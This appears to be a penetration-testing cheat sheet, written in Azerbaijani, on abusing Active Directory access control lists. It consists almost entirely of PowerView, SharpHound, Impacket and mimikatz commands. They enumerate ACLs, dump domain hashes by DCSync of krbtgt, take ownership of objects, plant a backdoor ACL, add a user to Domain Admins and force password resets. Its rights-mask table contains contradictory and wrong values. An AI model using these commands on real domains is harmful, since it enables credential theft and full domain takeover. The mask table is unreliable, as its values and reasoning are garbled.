# Access Control List Abuse
<img width="975" height="452" alt="image" src="https://github.com/user-attachments/assets/17d9ea44-b8ff-4610-928d-b7f608798107" />

## Access Control List Command
```
# Bütün domain object-lərinin ACL-lərini enum
Get-DomainObjectAcl -ResolveGUIDs | Select ObjectDN,ActiveDirectoryRights,IdentityReference

# User-ların ACL-ləri (GenericAll, WriteOwner, etc.)
Get-ObjectAcl -Identity user.samaccountname | ?{$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|Owner"}

# Group-ların ACL-ləri (DCSync potensialı)
Get-ObjectAcl -Identity "Domain Admins" | Select AceType,ActiveDirectoryRights,IdentityReference

# Computer-ların ACL-ləri (MachineAccountQuota abuse)
Get-ObjectAcl -Identity computer$ | ?{$_.ActiveDirectoryRights -match "GenericAll"}

# OU-ların ACL-ləri (Child creation)
Get-DomainOU | Get-ObjectAcl | ?{$_.ActiveDirectoryRights -match "CreateChild"}

# Domain root ACL (kritik)
Get-DomainObjectAcl -DomainController dc-ip | ?{$_.ObjectDN -eq "DC=domain,DC=com"}

# Abuse potensialı olan ACL-lər filtrlə
Get-DomainObjectAcl | ?{ $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|Owner|WriteOwner|DeleteChild" } | ft ObjectDN,ActiveDirectoryRights,IdentityReference -AutoSize
```

## SharpHound
```
SharpHound.exe --CollectionMethods All --Domain domain.com --OutputDirectory /tmp/bloodhound
```

## Impacket ilə LDAP ACL Enum
```
# DA ilə secretsdump + ACL parse
secretsdump.py domain/admin@dc-ip -just-dc

# ldapdomaindump (bütün ACL-lər)
ldapdomaindump -u 'domain\user' -p 'pass' dc-ip /tmp/ldapdump/
grep -r "GenericAll\|WriteDacl" /tmp/ldapdump/
```

## ACL Rights Mask-ları və Abuse Metodları
```

0x100	             | DELETE	Object sil	Remove-ADObject
0x20000	           | WRITE_DAC	ACL dəyişdir (WriteDacl)	Set-DomainObjectAcl
0x400	             | WRITE_OWNER	Owner dəyiş (Takeover)	Set-DomainObjectOwner
0x10	             | GENERIC_ALL	BÜTÜN rights (DCSync, ResetPass)	DCSync ilə dump
0x2	               | GENERIC_WRITE	AddMember, ResetPassword	Add-DomainGroupMember
0x8	               | GENERIC_EXECUTE	Read potensialı	Enum yalnız
0x1000f            | DS_READ_PROP	Properties oxu	Enum
0x40000000000000	 | DS_CONTROL_ACCESS (DCSync)	NTDS dump	secretsdump.py

GenericAll Abuse (0x100 + 0x10 = DCSync)
# DCSync icazəsi ilə NTDS dump
Get-DomainUser -Identity targetuser | Get-DomainSPNTicket  # Önce test
mimikatz.exe "lsadump::dcsync /domain:domain.com /user:krbtgt" exit

WriteOwner (0x20000) Abuse - Owner Takeover
# Owner-ı özünə dəyiş
Set-DomainObjectOwner -Identity "CN=targetuser,CN=Users,DC=domain,DC=com" -OwnerIdentity currentuser
# Sonra GenericAll əlavə et
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity currentuser -Rights All

WriteDacl (0x20000) Abuse - Backdoor ACL
$ACL = New-Object Security.AccessControl.ActiveDirectorySecurity
$ACE = New-Object Security.AccessControl.ActiveDirectoryAccessRule($UserSID,"GenericAll","Allow")
$ACL.AddAccessRule($ACE)
Set-DomainObject -Identity targetgroup -Replace @{'nTSecurityDescriptor'=$ACL}

GenericWrite (0x2) Abuse - Group Add/Password Reset
# Group-a add et (Domain Admins)
Add-DomainGroupMember -Identity "Domain Admins" -Members currentuser
# Password reset
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)

ForceChangePassword Abuse
# SPN user üçün pass reset (Kerberoast sonrası)
Set-DomainUser -Identity svc-sql -AccountPassword (ConvertTo-SecureString "Summer20!$" -AsPlainText -Force) -SamAccountName svc-sql
```
